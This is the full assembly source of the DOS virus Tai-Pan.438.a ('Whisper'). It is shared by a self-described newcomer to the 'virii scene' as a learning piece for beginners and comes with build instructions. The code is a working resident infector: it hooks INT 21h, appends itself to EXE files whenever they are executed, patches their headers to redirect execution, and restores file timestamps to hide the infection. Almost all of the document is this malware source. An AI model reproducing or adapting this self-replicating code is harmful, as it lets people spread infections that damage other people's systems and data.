
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; I found Tai-Pan.438.a on a CD from a german computer magazine in 1995. I know
; that Tai-Pan is a quite simple virii, but I learned a lot from it a few years
; ago. I think it is good for the beginners among us, because this virii is not
; to big/complex.

; Now some facts about this little beast:
; Name      : Tai-Pan.438.a
; Alias     : Whisper
; Size      : 438 Bytes
; Origin    : Sweden
; Discovered: Summer 1994
; Resident  : Yes (512 Bytes)
; target    : appending EXE (smaller than 64833 Bytes)
; Payload   : No :-(
; Infects   : on execution (4B00)

; Compiling instructions
; tasm /m2 tai-pan.asm
; tlink tai-pan

; If you have any comments or questions, feel free to contact me.
; I'm new in the virii scene and always on the search for new contacts.
;                                                                Evil-E
;                                                                Evil-E@gmx.net
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

.model tiny
.code

Org 0h
Virus_Start:
        call   Delta                          ; Get Delta offset
Delta:
        pop    si
        sub    si,3
        mov    ax,07BCEh                      ; Are-you-there call
        int    21h
        cmp    ax,07BCEh                      ; already active in memory ?
        jne    install_in_memory              ; No -> get resident
        push   cs
        pop    ds
        add    si,offset Virus_Data
        mov    di,offset Virus_Data
        mov    cx,VData
        cld
        rep movsb
        push   es
        pop    ds
        push   es
        mov    ax,offset already_resident
        push   ax
        retf
install_in_memory:
        mov    ah,048h                        ; try to allocate some  
        mov    bx,MemorySize                  ; memory paragraphs
        int    21h
        jnb    enough_memory_found
        mov    ax,ds
        dec    ax
        mov    ds,ax
        mov    bx,ds:[0003h]
        sub    bx,MemorySize+1
        mov    ah,04Ah                        ; shrink memory block
        int    21h
        jmp    install_in_memory
enough_memory_found:
        dec    ax
        mov    es,ax
        mov    es:word ptr [0001],0008h
        inc    ax
        mov    es,ax
        xor    di,di
        push   cs
        pop    ds
        mov    cx,VirusSize
        cld                                   ; Copy the Virus to the
        rep movsb                             ; allocated memory
        push   es
        mov    ax,offset in_memory
        push   ax
        retf
in_memory:
        push   cs
        pop    ds
        mov    ax,03521h                      ; Get Int 21h adress
        int    21h
        mov    word ptr ds:[oldint21],bx      ; Store int 21h segment
        mov    word ptr ds:[oldint21+2],es    ; and register
        mov    ah,025h                        ; Set new Int21h Handler
        mov    dx,offset Int21_Handler
        int    21h
already_resident:
        push   ss
        pop    ax
        add    ax,word ptr ds:[oldCS]
        mov    word ptr ds:[jmp_cs],ax        ; restore fileดs Code-Segment
        mov    ax,word ptr ds:[oldIP]
        mov    word ptr ds:[jmp_ip],ax        ; restore fileดs IP
        push   ss
        pop    ax
        sub    ax,0010h
        mov    es,ax
        mov    ds,ax
        push   ss
        pop    ax
        add    ax,word ptr cs:[oldss]
        cli
        mov    ss,ax                          ; restore file's Stack-Segment
        mov    sp,word ptr cs:[oldsp]         ; restore file's Stack-Pointer
        sti
        xor    ax,ax                          ; zero regs
        xor    bx,bx
        xor    cx,cx
        xor    dx,dx
        xor    si,si
        xor    di,di
        db     0EAh                           ; JMP FAR to the program's old entry
point
        jmp_ip   dw      0
        jmp_cs   dw      0

        Oldint21 dd      0                    ; original int21 adress

        message  db '[Whisper presenterar Tai-Pan]'

Int21_Handler:
        cmp    ax,07BCEh                      ; Are-you-there call ?
        je     Installation_Check
        cmp    ax,04B00h                      ; load and execute program ?
        jne    no_execution
        call   infect
no_execution:
        jmp    dword ptr cs:[oldint21]        ; far jump to org. Int 21h Handler

Installation_Check:
        push   cs                             ; return the adress of the
        pop    es                             ; virii in Memory in ES
        iret
infect:
        push   ax
        push   bx
        push   cx
        push   dx
        push   ds
        mov    ax,03D02h                      ; open File read/write
        int    21h
        jnb    successful_open
        jmp    open_error
successful_open:
        mov    bx,ax                          ; bx = File Handle
        mov    ah,03Fh                        ; Read the first 24 Bytes into mem
        mov    dx,offset Signature
        push   cs
        pop    ds
        mov    cx,headersize
        int    21h
        cmp    word ptr ds:[Signature],05A4Dh ; Is it an EXE-File ?
        jne    No_Exe_File
        mov    ax,04202h                      ; go to the end of the file
        xor    cx,cx
        xor    dx,dx
        int    21h
        cmp    ax,64833                       ; File bigger than 64833 Bytes ?
        ja     no_exe_file                    ; Yes -> no infection
        or     dx,dx
        jne    no_exe_file
        push   ax
        mov    dx,word ptr ds:[HdrSize]       ; Calculate Size of Header
        mov    cl,04
        shl    dx,cl                          ; *16 to get Bytes
        sub    ax,dx                          ; AX=Filesize-Headersize
        sub    ax,VirusSize                   ; Subtract VirusSize from AX
        cmp    ax,word ptr ds:[StartIP]       ; Is Header IP=AX then already infected
        pop    ax                             ; AX= FileSize
        jne    go_on
no_exe_file:
        jmp    close_file
go_on:
        push   dx                             ; Save HeaderSize
        push   ax                             ; Save FileSize
        mov    ax,05700h                      ; get file's last-written date/time
        int    21h
        mov    word ptr ds:[jmp_ip],cx        ; store file's time
        mov    word ptr ds:[jmp_cs],dx        ; store file's date
        mov    ah,040h                        ; Write virus to end of file
        mov    cx,offset virus_data
        xor    dx,dx
        int    21h
        mov    ah,040h                        ; Write the old values of
        mov    cx,VData                       ; ss,sp,cs,ip to end of file
        mov    dx,offset StartSS
        int    21h
        pop    ax                             ; AX=FileSize
        push   ax                             ; Save in Stack for next use ;-)
        add    ax,VirusSize                   ; Add VirusSize to AX to get the
        xor    dx,dx                          ; Size of the infected File
        mov    cx,0200h
        div    cx                             ; Divide by 512 to get pages
        inc    ax                             ; just one extra 512 Byte Page
        mov    word ptr ds:[ImgHi],ax         ; Save new number of pages in Header
        mov    word ptr ds:[ImgLo],dx         ; save the remainder in Header
        mov    word ptr ds:[StartSS],0000     ; Set Stack-Segment to 0
        mov    word ptr ds:[StartSP],0FFFFh   ; Set Stack-Pointer to 0FFFFh
        mov    word ptr ds:[StartCS],0000     ; Set Code-Segment  to 0
        pop    ax                             ; Load FileSize into AX
        pop    dx                             ; Get HeaderSize from Stack into AX
        sub    ax,dx                          ; Subtract HeaderSize from FileSize
        mov    word ptr ds:[StartIP],ax       ; =New AX
        mov    ax,04200h                      ; move at beginning of file
        xor    cx,cx
        xor    dx,dx
        int    21h
        mov    ah,040h                        ; write new EXE-header to file
        mov    cx,HeaderSize
        mov    dx,VirusSize
        int    21h
        mov    ax,05701h                      ; restore old date and time
        mov    cx,word ptr ds:[jmp_ip]
        mov    dx,word ptr ds:[jmp_cs]
        int    21h
close_file:
        mov    ah,03Eh                        ; Close File
        int    21h
open_error:
        pop    ds
        pop    dx
        pop    cx
        pop    bx
        pop    ax
        ret

Virus_Data:
        oldss        DW 0
        oldsp        DW 0
                     DW 0
        oldip        DW 0
        oldcs        DW 0FFF0h      ; in first generation JMP FAR to 
                                    ; PSP:00h -> int 20h

Virus_end:
        Signature    DW ?
        ImgLo        DW ?
        ImgHi        DW ?
        RelocItems   DW ?
        HdrSize      DW ?
        MinHeap      DW ?
        MaxHeap      DW ?
        StartSS      DW ?
        StartSP      DW ?
        Checksum     DW ?
        StartIP      DW ?
        StartCS      DW ?
        Reloc        DW ?

        VirusSize  EQU (Virus_End-Virus_Start)
        MemorySize EQU (496/16)
        VData      EQU (Virus_End-Virus_Data)
        HeaderSize EQU 018h

END
